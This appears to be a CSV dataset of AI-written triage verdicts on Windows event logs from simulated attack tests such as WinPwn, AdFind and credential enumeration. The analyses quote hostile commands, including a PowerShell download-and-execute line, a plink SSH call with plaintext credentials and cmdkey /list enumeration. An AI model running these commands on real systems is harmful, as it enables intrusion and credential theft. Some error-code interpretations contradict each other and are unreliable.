Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Upon reviewing the provided Windows event logs for Server002, I analyzed logs from the PowerShell, System, Sysmon, Security, and Application channels. Here is a detailed analysis of the logs:

### PowerShell Log Analysis

The PowerShell logs indicate the execution of the command `Get-ADDefaultDomainPasswordPolicy` via `powershell.exe`. The details are as follows:
- **HostName**: ConsoleHost
- **HostVersion**: 5.1.19041.5007
- **HostApplication**: `powershell.exe & {get-addefaultdomainpasswordpolicy}`
- **TimeCreated**: 2024-10-25 17:20:00.8019927

The command `Get-ADDefaultDomainPasswordPolicy` is typically used for querying Active Directory domain password policies. Execution of this command by itself is not inherently suspicious; however, it confirms that someone is querying domain password policies, which could be part of legitimate administrative tasks ***or*** reconnaissance activity by an unauthorized user.

### System Log Analysis

The system logs show:
- Multiple Kernel-General events indicating time adjustments, likely due to synchronization with a time service (`time.windows.com`).
- **TimeCreated**: 2024-10-25 17:20:00.3745561
- Synchronization is observed in both System and Security logs.

Adjustments in system time can be legitimate, tied to time service synchronization, but it can also be an evasion technique in certain cyberattack scenarios. In this context, however, the synchronization to `time.windows.com` appears legitimate.

### Sysmon Log Analysis

Several Sysmon events indicate process creation related to administrative utilities such as:
- **wevtutil.exe** (Event Log management)
- **conhost.exe** (Console host for console windows)
- **hostname.exe** (Displays computer name)
- **whoami.exe** (Displays active username)
- **PowerShell.exe** execution as seen in ID 17978.

Processes executed and captured by Sysmon logs appear to involve user `SERVER002\\admin_test`. The frequent execution of administrative tools (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) suggests active administration or perhaps another purpose. The use of `whoami.exe` to check the current user context could indicate an unauthorized user verifying access levels.

### Security Log Analysis

Security logs show time changes, aligning with system logs for `svchost.exe` by user `LOCAL SERVICE` (S-1-5-19), which is typical during valid time synchronization.

### Application Log Analysis

Records indicate typical operations by the Windows SPP (Software Protection Platform) service. No significant anomalies detected here.

### Assessment

The logs collectively highlight a few notable events: 
1. Execution of administrative queries via PowerShell (`get-addefaultdomainpasswordpolicy`).
2. Frequent use of event log utilities (`wevtutil.exe`) and user context verification (`whoami.exe`).
3. Time synchronization processes, appearing consistent with normal operations.

### Conclusion

While the observed actions involve administrative tools, they align with legitimate system management activities, barring context-specific irregularities or unauthorized access. However, the observed use of reconnaissance-related commands indicates a cautious concern for potential misuse.

**Resolution:**
- **SUSPICIOUS**: The activities appear administrative, yet opportunistic reconnaissance methods warrant further review. Investigate the user `admin_test` and their access rights/actions to ensure no unauthorized intent or escalation attempts. Additionally, verify the context and necessity of these commands against ongoing administrative tasks to confirm or rule out malicious intent."
WinPwn - generaldomaininfo,"Upon analyzing the provided logs from the Security, Windows PowerShell, Application, System, and Sysmon event logs, several indicators of potentially malicious activity have been identified:

1. **PowerShell Activity:**
   - Multiple PowerShell commands were executed using the `iex(new-object net.webclient).downloadstring(...)` method. This is often a sign of suspicious activity as it can be used to download and execute scripts from the internet without saving them to disk, which is a common technique used by attackers to bypass traditional anti-virus measures.
   - The script is being downloaded from a URL related to a raw GitHub content repository. It's attempting to execute `generaldomaininfo -noninteractive -consoleoutput`, which might indicate information gathering from the host or the domain.

2. **Suspicious Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed under the user `SERVER002\\admin_test` shortly before the PowerShell activity. While these processes are legitimate Windows applications, they may be leveraged by attackers in certain situations, especially when appearing prior to suspicious PowerShell activity.

3. **Sysmon Events - Process Executions:**
   - The Sysmon logs indicate the execution of `WindowsPowerShell`, which matches with the prior PowerShell activity.
   - `whoami.exe`, typically used for gathering user information, was executed, which can also be a sign of enumeration activity.

4. **Microsoft Edge Update Frequency:**
   - There is an unusually high frequency of `MicrosoftEdgeUpdate.exe` execution logs within a short period. While this could be legitimate software updating, the frequency and overlapping with suspicious activity warrant further review to ensure it's not part of an attacker’s evasion or persistence mechanism.

Given these findings, there are several red flags, notably the suspicious PowerShell invocation and script execution directly from an external URL, which is a classic red flag for potential malicious activity. Based on the available information, I would consider the activities observed in these logs as ""SUSPICIOUS"" and requiring further investigation. The specific PowerShell activity warrants a closer look to ensure no sensitive data is being exfiltrated or that no further malicious payload is executed.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed:**
- **Investigate the source** of the PowerShell script. If the URL is unfamiliar or untrusted, it may represent a compromised script.
- **Review web server logs** or firewall logs to identify other communications or downloads from the same domain.
- **Further analyze the behavior** on the system around the time the suspicious PowerShell script was executed, including any changes made to the system or network traffic patterns.
- **Check for indicators of compromise** related to the executed PowerShell command or GitHub repository in threat intelligence databases.
- **Isolate the host** if ongoing malicious activity is confirmed to minimize the risk of spreading or data exfiltration.
- Consider enacting tighter PowerShell execution policies and monitoring on executive-level machines to prevent similar occurrences in the future."
ESXi - VM Discovery using ESXCLI,"### Detailed Analysis of the Logs

**1. Review of Security Logs:**
- **Multiple EventID 4624 (Successful Logon):** These events involve the `SYSTEM` account on `Server002`. The logon type is 5, which corresponds to a service startup, and the authentication process is consistent with internal system operations. There doesn't appear to be anything malicious about these log events alone, as they are common for system processes.
  
- **EventID 4672 (Special Privileges Assigned):** Special privileges such as `SeDebugPrivilege`, `SeTcbPrivilege`, and others are assigned to the `SYSTEM` account. Again, these are standard for the `SYSTEM` account in many environments.
  
- **EventID 4798 (Group Membership Enumeration):** Frequent enumeration of user groups related to various accounts, including `admin_test` which can indicate that someone is checking for user permissions, possibly assessing privilege escalation opportunities. This could be suspicious especially since it's being executed by `taskhostw.exe`, a process associated with running DLL-based tasks.
  
- **EventID 5379 (Credential Validation):** Numerous failed attempts to validate credentials for a Microsoft account (`02txoixylodcstop`). The `ReturnCode` is `3221226021`, indicating a failure which might suggest probing or unauthorized attempts to access certain credentials.

**2. Review of Sysmon Logs:**
- **Execution of Powershell and wevtutil.exe:** Execution of `powershell.exe` and `wevtutil.exe` by the user `admin_test` is questionable if unexpected, given that these tools are often used for administrative purposes or attacks involving event log management.
  
- **Execution of Plink.exe with Credentials:** Execution of `plink.exe` (part of PuTTY suite used for SSH connections) to a remote server using explicit credentials (`-l ""root"" -pw ""pass""`) indicates potential unauthorized data transfer or further attacks on the network. This is highly risky as it means data could be exfiltrated or malicious commands could be executed remotely.

- **Use of cmd.exe and whoami.exe:** These are normal command-line utilities, but their combined use, especially coupled with `plink.exe`, suggests actions being taken that are out of the ordinary automated tasks.

**3. Application Logs:**
- **EventID 16394 from Software Protection Platform Service:** This indicates regular license service activities, likely unrelated to the suspicious behavior.

### Assessment:
Based on the logs provided, there are multiple indicators suggesting potentially suspicious behavior. The enumeration of user groups, the failed credential validations, and the use of `plink.exe` in conjunction with plaintext credentials are particularly concerning.

### Resolution:
**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Contain and Review:** Immediately contain any activities related to `admin_test` account and further inspect all active sessions from this account for any unauthorized commands or actions.
2. **Investigate Network Activity:** Check network logs for any unauthorized connections from `Server002` to external IP addresses to see if data exfiltration occurred.
3. **Credential Audit:** Review and reset credentials associated with any active directory accounts that appeared in logs.
4. **System Integrity Checks:** Conduct a thorough investigation on `Server002` to verify the integrity of system files, check for unauthorized changes, and monitor for any persistence mechanisms.
5. **Initiate Full Incident Response:** If further suspicious actions are verified, initiate a full incident response plan to address potential threats and vulnerabilities in the system."
WinPwn - printercheck,"### Analysis of the Logs

#### Unusual and Suspicious Activity:

1. **Repeated Process Execution of `wevtutil.exe` and `conhost.exe`:**
   - Logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. `wevtutil.exe` is typically used for managing event logs, which by itself is not suspicious, but frequent execution could indicate an attempt to clear or manipulate logs, especially when performed by a user account under the context ""admin_test"", which might not be a standard administrative account.

2. **PowerShell Command Execution:**
   - The command line associated with `powershell.exe` includes a script being downloaded and executed from a remote repository:
     ```
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), printercheck -noninteractive -consoleoutput}
     ```
   - `iex` (Invoke-Expression) and `new-object net.webclient` are often used in malicious scripts to download and execute malicious code without leaving traces on disk.

3. **Execution Context:**
   - The PowerShell script executes under high integrity, suggesting administrative privileges, which could imply an elevation of privileges, potentially allowing the script to perform unauthorized actions.

4. **Network-Based Script Download:**
   - The script is being fetched from `https://raw.githubusercontent.com/script`, which is unusual for enterprise settings as scripts should typically be sourced from internal or trusted repositories.

5. **Launching of Multiple Microsoft Edge Update Executables:**
   - Numerous executions of `MicrosoftEdgeUpdate.exe` with varying command-line arguments (like `/svc`, `/update`, `/ping`, `/regsvc`) in quick succession is suspicious. Legitimate update processes do not typically spawn such numerous processes with varied arguments in a short timeframe.

6. **Execution of Built-In Windows Utilities:**
   - Execution of utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe` might indicate post-exploitation reconnaissance activities.

#### Indicators of Malicious Activity:

- **PowerShell Script Execution:**
  - The PowerShell command observed is indicative of a potentially malicious activity aimed at downloading and running a script from the internet.

- **Multiple Instances of Built-In Executables:**
  - Frequent execution of tools like `wevtutil`, `conhost`, `whoami`, and others, especially under an administrative context, may indicate efforts to gain persistence or obfuscate activities.

### Assessment and Conclusion

Based on the analysis of the log entries, there is a clear pattern of potentially malicious activity:

- Execution of potentially malicious PowerShell commands fetching scripts from an untrusted source.
- An unusual frequency of built-in utilities and Microsoft Edge update executions that do not align with normal system operations in quick succession.

**Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Isolation:**
   - Isolate the affected host `Server002` from the network to prevent further spread or exfiltration of data.

2. **Conduct a Full Malware Scan:**
   - Perform a deep malware scan using up-to-date antivirus software on the host to detect and remove any malicious software.

3. **Review and Reverse Unauthorized Changes:**
   - Inspect the system logs for unauthorized changes to system settings, registry, and scheduled tasks.
   - Reverse any unauthorized changes identified.

4. **Patch Management and Security Audit:**
   - Ensure all systems are up to date with the latest security patches and perform a thorough security audit to ascertain any other vulnerabilities.

5. **Analyze Impact and Monitor:**
   - Review potential data loss or reconnaissance activity and monitor other systems for similar behavior.

6. **Incident Report and Documentation:**
   - Document the incident thoroughly and report it according to your organization’s incident response policies."
Security Software Discovery - AV Discovery via WMI,"Upon analyzing the provided Windows event logs, the following observations can be made:

### Suspicious or Anomalous Behavior
1. **Time Change Events (Security Log Event ID 4616)**: The Security log indicates frequent time set operations by the `svchost.exe` process run by `LOCAL SERVICE`. These changes are quick and frequent, which is uncommon for regular system operations and can sometimes suggest attempts to manipulate time logs to cover activity.

2. **Process Creation and Execution (Sysmon Event ID 1 and 5)**:
   - A repeated pattern of process executions involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` originating from the `admin_test` user. The use of `wevtutil.exe` can be benign or used for malicious purposes, such as dumping event logs.
   - The execution of `cmd.exe` with the command-line argument to execute `wmic.exe` to check antivirus status via the command `""cmd.exe"" /c wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`. This could suggest reconnaissance or preparation actions taken to understand the environment, which could potentially be a precursor to a more significant action.

### Indicators of Compromise:
- **Command-Line Usage and Reconnaissance**: The execution of `wmic.exe` to gather information about the antivirus product indicates at least a suspicious action or reconnaissance behavior.
- **Process Behavior**: The repeated invocation of `wevtutil.exe`, a utility that can manage logs, might suggest tampering or log-clearing activities, which could be malicious if executed without clear justification or in context of other suspicious activities.

### Assessment of the Situation
The logs present behavior that is concerning but not conclusively malicious without further context. The presence of administrative type commands (like `wevtutil.exe`, `wmic.exe`) suggest potential misuse or exploration by someone with `admin_test` account access. This pattern of accessing security-related utilities following the manipulation of time settings points towards potentially suspicious activity.

### Threats or Risks Identified
- **Potential Information Gathering**: Tactics involving `whoami.exe` and `wmic.exe` might indicate information-gathering to sense the security posture.
- **Log Manipulation or Clearing**: Potential use of `wevtutil.exe` could be suspect if aligned with other unauthorized activities.

### Recommendations and Guidance on How to Proceed
1. **Review Access Logs**: Check user activities surrounding the timestamp for any creation, modification, or deletion that could correlate with the suspicious events.
2. **Isolate and Monitor the System**: Consider isolating the affected system to monitor further for any suspicious activity.
3. **Credential Audit**: Verify the legitimacy and recent activities related to the `admin_test` account, considering potential misuse.
4. **Further Investigation**: Engage with potential malicious users, possibly escalate to a forensic investigation if other, undetected activities corroborate suspicion.

### Conclusion
The resolution is marked as **SUSPICIOUS**. While the actions logged do not definitively indicate malware or confirmed compromise, the pattern suggests behavior worth escalating and investigating further to ensure no malicious activity is currently active or undetected."
File and Directory Discovery (cmd.exe),"Upon analysis of the provided Windows event logs, the following observations and conclusions have been made:

### Analysis:
1. **Svchost Time Manipulation:**
   - There is a series of events indicating time changes initiated by the `svchost.exe` process, which is a legitimate Windows process designed to host services. The time changes in the Kernel-General log entries and corresponding security logs indicate that these changes are not typical behavior and can sometimes be indicative of attempts to bypass detection or manipulate event logs.

2. **High Integrity Process Execution:**
   - Processes like `cmd.exe` and `whoami.exe` executed with high integrity levels suggest administrative privileges, which is not uncommon but should be contextualized with user activity. The presence of rapidly executed commands with potentially data exfiltration or enumeration intentions (as seen in the command line with multiple directory listings) is typical of both legitimate administrative activities and malicious behaviors.

3. **Network and User Logons:**
   - There are multiple successful logons related to the `admin_test` account with high privileges. The logon types recorded (Type 3 - network logon) suggest remote access, which could be legitimate or potentially indicative of unauthorized access, especially given the high privileges.

4. **Service and Software Updates:**
   - Frequent updates and service management via `taskhostw.exe`, `sc.exe`, and Edge Update processes (`MicrosoftEdgeUpdate.exe`) are present. While these activities themselves are not inherently suspicious, their path of execution and frequency can be a vector for attackers to hide malicious activities, particularly if they involve uncommon paths or user accounts.

5. **Sysmon Logs:**
   - Repeated execution of tools like `cmd.exe` with extensive command-line arguments could potentially match adversarial behaviors focused on data collection or system reconnaissance.
   - The presence of `wevtutil.exe` processes signifies command-line utility use, typically leveraging event log manipulation, which could accommodate evidence tampering.

### Conclusion:
From the above findings, the logs contain signs that could merit further investigation. Specifically, the time manipulation attempts, high integrity process executions by an administrative account, and voluminous network logons could be seen as red flags in a security context.

### Resolution:
- **SUSPICIOUS**: Given the indicators above, there is enough suspicion to warrant a more thorough investigation. While absolute maliciousness cannot be asserted without further context and corroborative evidence (e.g., confirmation of these activities from user intent logs or corroborating alerts from other security tools), the activity does raise concerns about potential unauthorized access or misuse of administrative privileges.

### Guidance on Proceeding:
- Conduct a comprehensive review of access logs and network traffic related to the `admin_test` account, especially focusing on activity origin (IPs and timestamps).
- Cross-reference the `cmd.exe` and `svchost.exe` processes against known threat intelligence for potential Indicators of Compromise (IoCs).
- Consider isolating the affected machine to prevent potential data exfiltration or lateral movement within the network.
- Implement enhanced monitoring and alerting for processes exhibiting similar behavior in the future to better detect ongoing activities."
System Time Discovery W32tm as a Delay,"Upon reviewing the provided logs, several aspects caught my attention regarding the activities on the Windows host, specifically on ""Server002"":

1. **Use of System Utilities and Services:**
   - The execution of utilities such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and `w32tm.exe` is all part of standard Windows operations, especially for querying system information or utilities related to authentication and time synchronization.
   - The invocation of `wevtutil.exe`, a utility used to manage event logs, is noted. Its frequent launching could indicate either regular log management or potentially clearing event logs if not expected in the environment.

2. **Microsoft Edge Update Activities:**
   - There are multiple instances and processes related to `MicrosoftEdgeUpdate.exe` observed in the Sysmon logs. The commands executed via this service typically relate to legitimate background update processes by Microsoft.
   - The use of a Temp directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUAFAE.tmp`) in conjunction with Edge Update processes also aligns with typical update behavior, although temp locations can sometimes be used maliciously.

3. **Time Synchronization Activity:**
   - The commands involving `w32tm.exe` seem to align with legitimate time synchronization tasks. The logs show time adjustments and NTP synchronization (`time.windows.com`) being carried out, which are expected behaviors for maintaining time accuracy on systems.

4. **Privileges and Integrity Levels:**
   - Many processes run under the `NT AUTHORITY\\SYSTEM` user, reflecting higher privilege levels. This usage is typical for system operation but requires attention as it can be abused for privilege escalation attacks.
   - Activities performed with `High` integrity level, such as by the user `SERVER002\\admin_test`, indicate actions executed with elevated permissions, often standard for administrative users.

5. **Security and System Logs:**
   - Event IDs 4616 in the Security logs show a normal time-change event, which lines up with time-sync operations observed and is not suspicious in itself.

**Assessment:**
From the analysis of the logs provided, the activities and events observed appear to be consistent with routine operations on a Windows host. The executions of system tools and the behavior of Edge Update services do not inherently indicate malicious activity. However, the extensive use of system utilities and high-level privileges warrant monitoring, particularly in sensitive systems such as the machine belonging to a CEO.

**Resolution:**
- **BENIGN**: Current log analysis reveals no explicitly malicious activities. The activities observed are consistent with normal system operations, software updates, and time synchronization tasks.

**Guidance:**
- Continue monitoring for any changes in behavior that might indicate escalation or anomalies.
- Ensure that logging and endpoint protection measures remain active to catch potentially suspicious activities in the future.
- Consider reviewing and validating configuration settings around the use of system utilities to confirm they align with business requirements."
Adfind - Query Active Directory Groups,"**Analysis of Logs:**

1. **Security Log:**
   - **EventID 4624:** Successful logon with LogonType 5 (Service) by SYSTEM account. This is a normal event as SYSTEM services often log on in this manner for operations.
   - **EventID 4672:** Special privileges assigned to a new logon, indicating the use of privileges like SeDebugPrivilege, SeBackupPrivilege, etc., by the SYSTEM account. This is common for administrative tasks and not necessarily suspicious unless abused.

2. **Application Log:**
   - Both events (EventID 15) indicate Windows Defender being active with its security state as ""ON."" This shows that Windows Defender is active and not disabled, which is a healthy sign.

3. **Sysmon Log:**
   - The logs display multiple processes being executed by the user `SERVER002\admin_test`. 
   - **PowerShell Execution:** A PowerShell instance was started, which is often used by attackers for various malicious activities, but it's also used by administrators for legitimate tasks.
   - **Wevtutil and Conhost Execution:** Multiple instances of `wevtutil.exe` and `conhost.exe` were executed. `Wevtutil` is a Windows Event Log utility and its frequent execution may suggest attempts to clear event logs, which could be suspicious without context.
   - **HOSTNAME and WHOAMI Command Execution:** These commands are often used for environment recon, possibly to gather machine information. These executions along with AdFind.exe suggest potential reconnaissance actions.
   - **Command Execution (AdFind.exe):** Notably, `cmd.exe` was executed with `AdFind.exe`. AdFind is a legitimate tool but can be used for Active Directory reconnaissance by attackers.

4. **System Log:**
   - No relevant data was provided in the System log.

5. **Windows PowerShell Log:**
   - No relevant data was provided in the Windows PowerShell log.

**Assessment:**

The combination of executing `AdFind.exe`, PowerShell, and the use of `wevtutil.exe` could indicate malicious intent, especially if used to delete logs or perform reconnaissance in a compromised environment. The presence of administrative command execution and potential reconnaissance aligns with tactics used in attacks such as credential dumping and lateral movement preparation.

**Threats and Risks Identified:**
- The execution of `AdFind.exe` and `wevtutil.exe` indicates possible reconnaissance and clearing of event logs, activities often associated with malicious intent.
- The frequent execution of administrative commands (`whoami`, `hostname`, PowerShell) can imply unauthorized privilege use or preparation for further compromise.

**Guidance and Resolution:**

1. **Immediate Actions:**
   - Investigate the purpose and origin of the PowerShell and AdFind executions. Determine if they were part of an authorized administrative activity.
   - Review user `SERVER002\admin_test` activities and permissions, considering this user might be compromised.
   - Check network logs for unusual connections or data transfers correlating to the timeline of suspicious activities.

2. **Preventive Measures:**
   - Implement monitoring for suspicious use of administrative tools.
   - Ensure PowerShell script block logging and command line auditing are enabled to capture detailed PowerShell activities.
   - Regularly audit administrative accounts and privileges.

**Resolution: SUSPICIOUS**

The activities are suspicious given the context and potential associated behaviors with known attack techniques. Further investigation is warranted to confirm if these actions are legitimate or part of a security breach."
Hostname Discovery (Windows),"After analyzing the provided event logs, here is the assessment:

### System Log Analysis
- The system logs indicate frequent time discrepancies (`EventID: 24` and `EventID: 1`). The system time was adjusted backwards by a few seconds multiple times. If these changes aren't synchronized with a legitimate time source like a time server, they can be deemed suspicious as time changes are sometimes used to confuse logs or maintain persistence by restoring an environment after making changes. However, the changes appear closely monitored by `svchost.exe`, a legitimate process.

### Sysmon Log Analysis
- Several instances of processes being spawned, specifically `wevtutil.exe` and `conhost.exe`, were observed frequently (`EventID: 5`). The `wevtutil.exe` command is commonly used for querying event logs, which can indicate either benign system administration or malicious activity like log clearing to cover tracks.
- The process `cmd.exe`, executed with a `/c hostname` argument, and utilities like `whoami.exe` were run but generally, these commands are benign unless they're used in a broader malicious context, e.g., reconnaissance.
- Instances of `MicrosoftEdgeUpdate.exe` running in different contexts are present. These events align with a typical update sequence for an application but should be verified to completely rule out protocol exploitation.

### Security Log Analysis
- Multiple logon and logoff events, with high privileges, match normal user activity patterns. The `SeDebugPrivilege` is commonly seen in privileged logons which were used in this context indicating a privileged admin session.
  
### Application Log Analysis
- The application log shows `edgeupdate` service was stopped; this is consistent with updating software and does not intrinsically indicate malicious activity.

### Assessment
1. **Time Discrepancies**: Although system time adjustments are often indicative of unwanted behavior like log deception, its presence alone (without additional context or deviations from sanctioned time authorities) is not immediately alarming.
2. **Utility Usage**: Usage of `wevtutil.exe`, `cmd.exe`, `whoami.exe`, etc., could suggest administrative activity, but repetitive `wevtutil.exe` actions could indicate potential log tampering.
3. **Edge Update Activity**: Though extensive, this behavior connotes a typical update operation, not necessarily malicious unless protocol abuse or unexpected behavior from these processes arises.

### Conclusion
Based on current evidence, the logs primarily suggest routine system operations with a small chance of abnormal timing adjustments and process executions that require more context. Given that no clear evidence of malicious commands or abnormal patterns were noticed, the activity is categorized as:

**RESOLUTION: SUSPICIOUS**

### Guidance
- Continue monitoring and verify with additional telemetry or insights from IDS/IPS for persistent anomalies or patterns associated with compromise.
- Ensure time adjustments align with the organization's policy for time synchronization.
- If feasible, conduct a forensic analysis of the `wevtutil.exe` invocations for contextual confirmation of benignity or intent."
Reg query for AlwaysInstallElevated status,"**Detailed Analysis of the Logs:**

**System Log:**
- The events pertain to Windows Update activities, specifically related to Microsoft Defender Antivirus updates. These entries indicate a routine security intelligence update.

**Windows PowerShell Log:**
- No entries provided for analysis.

**Security Log:**
- Multiple EventID 5379 entries, indicating credential validation attempts with ReturnCode 3221226021 (STATUS_NO_SUCH_USER). This error is relatively common in environments where there are attempts to validate non-existent accounts, but the sheer volume implies a potential brute force or enumeration activity.

**Sysmon Log:**
- The logs reveal several command-line and process activities involving administrative tools such as `wevtutil`, `whoami`, and `cmd.exe`.
- Importantly, there is an instance of `cmd.exe` executing a query on the registry for ""AlwaysInstallElevated"" settings. When enabled, this setting can allow non-privileged users to execute MSI installation files with elevated privileges, which can be exploited for privilege escalation.
- Additionally, the presence of `wevtutil` and `wevtutil` subprocesses, often used in log management, could indicate attempts to clear event logs if used maliciously, although no explicit log-clearing commands were observed here.

**Application Log:**
- A single entry noting Windows Defender being in the security product state on confirms that the antivirus was active during this period.

**Assessment of the Situation:**

The Windows event logs demonstrate routine system operations mixed with some potentially anomalous behavior. The repeated credential validation failures could indicate a password spraying attack or misconfigured scheduled tasks or services, especially given the use of a pattern-like account name.

The registry query for ""AlwaysInstallElevated"" is a red flag for privilege escalation attempts, especially when executed with `cmd.exe` at a high integrity level. This, combined with process events indicating the usage of tools that handle logs, potentially suggests an attempt at stealth or reconnaissance.

**Threats or Risks Identified:**

- **Credential Attempt Patterns:** The repeated failures in credential reading indicate possible malicious attempts to access accounts.
- **Registry Queries to Elevate Privileges:** Checking ""AlwaysInstallElevated"" demonstrates a serious risk factor, as this setting can be exploited for unwanted privilege escalation, leading to potential system compromise.

**Guidance on How to Proceed:**

1. **Investigate the Source of Credential Attempts:** There should be a review of access patterns, especially focusing on any related source IP addresses, to determine potential unauthorized access attempts.
   
2. **Review Registry Settings for ""AlwaysInstallElevated"":** Ensure that this setting is not enabled on systems unless absolutely required and secured.

3. **Verify System Integrity and Log Authenticity:** Since tools used might hint at log manipulation, check for integrity across the system logs against possible tampering or clearing.

4. **Increase Monitoring and Incident Response Readiness:** Enhance monitoring for any subsequent unauthorized attempts or successful breaches, and prepare the incident response team to act swiftly.

**Resolution:**
- **SUSPICIOUS** - The logs contain activity that suggests both reconciliation and initial phases of attack tactics that warrant a deeper investigation into the account access attempts and environmental baseline deviations. Additional investigation is needed to dismiss or confirm the extent of any potential compromise."
Enumerate all accounts on Windows (Local),"### Analysis:

#### 1. **Sysmon Log Analysis:**

- **Microsoft Edge Update Events**:
  - Numerous Sysmon Event ID 1 (Process Creation) and Event ID 5 (Process Termination) entries related to `MicrosoftEdgeUpdate.exe` from ""C:\\Program Files (x86)\\Microsoft"" are observed. These relate to the update process for Microsoft Edge, showing routine updates or installations. Such activity is expected from legitimate applications, especially in cases where automatic updates are enabled.

- **Suspicious Command Execution**:
  - There is a `cmd.exe` execution with the following command line: `""cmd.exe"" /c net user & dir c:\Users\ & cmdkey.exe /list & net localgroup ""Users"" & net localgroup`. This script-like execution aiming at user enumeration and credential storage querying may point to a potentially malicious script. This pattern can be indicative of reconnaissance or lateral movement attempts, often seen in unauthorized activities or attacks.

- **High Integrity Operations**:
  - The events executed by the user `SERVER002\\admin_test` are performed at a high integrity level, which indicates administrative privileges. This includes commands like `whoami.exe`, `hostname.exe`, `cmd.exe` with various switches, and `net.exe/net1.exe`. These can be benign in a heavily automated or testing environment, but in a production environment, they warrant further investigation especially alongside suspicious command line activity.

#### 2. **Security Log Analysis**:
- **Credential Enumeration**:
  - Event ID 5379 shows administrative user `admin_test` tried reading credential information but received an unsuccessful return code (3221225567 - often indicating ""Access Denied""). This event aligns with the suspicious `cmdkey.exe /list` command found in the Sysmon logs.
  
#### 3. **Application Log Analysis:**
- **Edge Update Service**: Regular service operations were noted without any anomalies indicating compromise. It aligns with the legitimate update checks or service registration events seen via `MicrosoftEdgeUpdate.exe`.

#### 4. **System Log Analysis**:
- **Time Synchronization Events**: Time synchronization activities seen in System logs are normal operations, ensuring the system clock is aligned with internet time servers.

### Conclusion:

Based on the log activities:
- The frequent executions of `MicrosoftEdgeUpdate.exe` seem benign and align with routine software updates.
- However, the execution of commands aimed at user enumeration and credential listing using `cmd.exe`, `cmdkey.exe`, and `net.exe` executed at high integrity levels indicate potentially suspicious behavior that needs to be validated further.

Adfind - Enumerate Active Directory Computer Objects,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided event logs from the Security, Application, Sysmon, and System logs, several aspects of these logs have been examined to identify potential signs of malicious activity.

1. **Security Logs:**
   - **Event ID 4624**: Reflects successful logon. Logon type 5 indicates a service (scheduled task or service account). This is typically benign unless related to unexpected or suspicious service creation.
   - **Event ID 4672**: Privilege assignment; the SYSTEM account has high privileges. The use of typical privileges like `SeDebugPrivilege` and `SeTcbPrivilege` align with this account's standard behavior.
   - **Event ID 5379**: Indicates credential retrieval but consistently shows a return code of `3221226021`, which translates to an error (STATUS_DUPLICATE_OBJECTID). The repeated failed credential access attempts might be suspicious, especially given the unrecognized `MicrosoftAccount:user=02txoixylodcstop`.

2. **Sysmon Logs:**
   - **Powershell Execution**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed by `SERVER002\admin_test` could indicate malicious activity depending on the executed script or command.
   - **Unusual Process Chains**: `cmd.exe` execution with a suspicious command line running `AdFind.exe`, often seen in post-exploitation frameworks. This indicates potential data gathering or lateral movement prep (MALICIOUS).
   - **Service Control (sc.exe)**: Multiple listings of `sc.exe` starting services, which can be normal but should be noted in the context of other suspicious activities.
  
3. **Application Logs:**
   - Windows Defender remains operational (`SECURITY_PRODUCT_STATE_ON`), which suggests active protection but does not exclude potential evasion techniques by the attacker.

4. **System Logs:**
   - Reflect routine updates and system operations, including antivirus definitions (benign).

**Assessment and Conclusion:**
- The presence of `AdFind.exe` execution through `cmd.exe` is highly concerning and indicative of potential malicious post-exploitation activity often used for Active Directory reconnaissance by adversaries.
- The unauthorized and repeated credential access attempts with return errors further support suspicious behavior, potentially indicating brute-force attempts or data theft efforts.
- Despite normal service operations and Windows Defender being on, the presence of such post-exploit behavior coupled with an unusual command-line execution pattern aligns more with malicious intent.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
- Immediate containment measures should be executed to isolate the affected machine (Server002) from the network.
- Further investigation is required to identify the source and impact of the `AdFind.exe` execution and potential data accessed or exfiltrated.
- A forensic deep dive should be conducted to ensure no other undetected threat persistence or lateral movement exists in the environment.
- Password resets and a review of privileged accounts are recommended to prevent further unauthorized access."
Enumerate All Network Shares with Snaffler,"Upon analyzing the provided Windows event logs, several points of concern indicate potentially malicious activity:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution with Encoded Commands**:
   - The PowerShell logs show execution of encoded commands, which is a common technique used by attackers to obfuscate malicious activities.
   - Example:
     ```plaintext
     powershell -encodedCommand IABjAG0AZAAg...
     ```

2. **Execution of External Scripts**:
   - There are multiple executions of a script located in `C:\Users\ADMIN_..\\Externalfiles\\script.exe` using PowerShell and cmd.exe. The path juggling with `..` indicates potential attempts to hide or obfuscate the true path of execution, which is suspicious.

3. **Privilege Escalation and Use of Powerful Privileges**:
   - Security logs (EventID 4672) show `admin_test` user acquiring high-level privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege` which are often used to perform privilege escalation or manipulate the system in unauthorized ways.

4. **Multiple Process Executions**:
   - Sysmon logs show repeated spawning of processes like `conhost.exe` and `wevtutil.exe` in quick succession, following the execution of PowerShell commands. These processes are often associated with command-line interfaces and event log utilities, respectively, and the frequency and manner of execution raise concerns.

5. **Unusual Network Activity**:
   - The security logs (EventID 4624) indicate logon activities using NTLM authentication from an external IP address, which is notable for a machine like the CEO’s.

### Assessment of the Situation:
The presence of encoded PowerShell commands, execution of suspicious scripts, and the acquisition of high-level privileges by the `admin_test` user suggest potential malicious activity. The use of NTLM from an external IP address points to unauthorized access possibly achieved through compromised credentials.

### Threats or Risks Identified:
- **Possibility of Malware Execution**: Execution of external scripts might pertain to malware or unauthorized scripts that could compromise system integrity.
- **Unauthorized Access**: Potential exploitation of user credentials leading to unauthorized access and privilege escalation.
- **Privilege Escalation**: The use of powerful privileges could allow for malicious persistence mechanisms or system manipulation.

